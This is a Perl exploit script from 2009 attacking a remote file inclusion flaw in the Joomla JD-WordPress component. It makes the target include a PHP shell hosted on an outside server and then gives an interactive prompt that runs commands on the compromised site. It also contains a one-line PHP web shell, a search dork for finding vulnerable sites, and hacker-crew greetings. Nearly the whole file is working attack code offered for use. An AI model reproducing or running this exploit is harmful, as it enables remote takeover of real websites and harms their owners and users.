#!/usr/bin/perl

#####
# [+] Author	: Don Tukulesto (root@indonesiancoder.com)
# [+] Date 	: October 20, 2009
# [+] Homepage	: http://www.indonesiancoder.com
# [+] Vendor 	: www.joomladeveloping.org
# [+] version 	: 2.0 RC2
# [+] Method	: Remote File Inclusion
# [+] Dork 	: "Kill-9"+"IndonesianCoder"
# [+] Location 	: INDONESIA
# [~] Notes	: Jika kami bersama, Nyalakan tanda bahaya. Jika kami berpesta, Hening akan terpecah.
# Aku dia dan mereka, Memang gila memang beda. Tak perlu berpura pura, Memang begini adanya. ( SupermanIsDead ft. Shaggy Dog )
# to M3NW5	: Kembalilah ke jalan mu nak, jangan berpaling dari "Nya"
# to kaMtiEz	: thx yah !!!! &#65533; 15 Jam dapet hasil jg :"> ( tunggulah aku di kotamu )
# to MALINGSIAL	: TRULLY THIEF IN ASIA ! N.A.T.O BIATCH !
# [~] How To	:
# perl tux.pl <target> <weapon url> cmd
# perl tux.pl http://127.0.0.1/path/ http://www.indonesiancoder.org/shell.txt cmd
# Weapon example: <?php system($_GET['cmd']); ?>
#####
use HTTP::Request;
use LWP::UserAgent;
$Tux = $ARGV[0];
$Pathloader = $ARGV[1];
$Contrex = $ARGV[2];
if($Tux!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
head();
sub head()
 {
 print "[o]============================================================================[o]\r\n";
 print " |		Joomla JD-WordPress Vulnerability File Inclusion		|\r\n";
 print "[o]============================================================================[o]\r\n";
 }
while()
{
      print "[w00t] \$";
while(<STDIN>)
      {
              $kaMtiEz=$_;
              chomp($kaMtiEz);
$arianom = LWP::UserAgent->new() or die;
$tiw0L = HTTP::Request->new(GET =>$Tux.'components/com_jd-wp/wp-feed.php?mosConfig_absolute_path='.$Pathloader.'?&'.$Contrex.'='.$kaMtiEz)or die "\nCould Not connect\n";
$abah_benu = $arianom->request($tiw0L);
$tukulesto = $abah_benu->content;
$tukulesto =~ tr/[\n]/[&#65533;]/;
if (!$kaMtiEz) {print "\nPlease Enter a Command\n\n"; $tukulesto ="";}
elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
      {print "\nCann't Connect to cmd Host or Invalid Command\n";exit}
elsif ($tukulesto =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($tukulesto =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[&#65533;]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}
else {print "[w00t] \$";}}}last;
sub usage()
 {
 head();
 print " | Usage:  perl tux.pl <target> <weapon url> <cmd>                              |\r\n";
 print " | <Site> - Full path to execute ex: http://127.0.0.1/path/                     |\r\n";
 print " | <Weapon url> - Path to Shell e.g http://www.indonesiancoder.org/shell.txt    |\r\n";
 print " | <cmd> - Command variable used in php shell                                   |\r\n";
 print "[o]============================================================================[o]\r\n";
 print " | 	IndonesianCoder Team | KILL-9 CREW | ServerIsDown | AntiSecurity.org    |\r\n";
 print " |   kaMtiEz, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S      |\r\n";
 print " |  Jack-, Contrex, yadoy666, Ronz, noname, s4va, gonzhack, cyb3r_tron, saint   |\r\n";
 print " |    Awan Bejat, Plaque, rey_cute, BennyCooL, SurabayaHackerLink Team and YOU! |\r\n";
 print "[o]============================================================================[o]\r\n";
 print " |	http://www.IndonesianCoder.org	   |	http://www.AntiSecRadio.fm 	|\r\n";
 print "[o]============================================================================[o]\r\n";
 exit();
 }